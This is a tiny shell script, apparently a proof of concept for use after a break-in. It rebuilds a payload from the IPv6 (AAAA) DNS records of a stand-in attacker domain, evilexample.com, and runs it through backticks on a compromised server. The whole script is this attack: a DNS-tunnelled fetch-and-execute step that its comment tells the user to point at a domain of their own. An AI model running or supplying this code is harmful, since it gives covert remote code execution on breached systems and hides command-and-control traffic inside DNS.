#!/bin/sh

# this script is intended to be run on the compromissed server
# CHANGE THE DOMAIN FROM evilexample.com to something you own ;-)

`dig +short AAAA a.evilexample.com | sort -n  | cut -f2- -d':' | tr -d ':' | xxd -p -c 14 -r`
